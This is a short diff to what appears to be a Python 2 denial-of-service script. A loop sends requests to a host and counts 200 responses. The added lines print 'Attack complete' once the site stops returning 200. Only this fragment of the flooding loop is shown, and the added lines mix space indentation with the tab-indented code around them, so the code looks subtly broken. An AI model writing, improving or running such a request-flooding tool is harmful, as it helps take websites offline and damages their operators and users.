@@ -17,3 +17,5 @@ while True:
 	if r.status_code == 200:
 		reqnum += 1
 		print "{0} requests sent to {1}".format(reqnum, host)
+        else:
+                print "Attack complete, site no longer returning 200 Status"
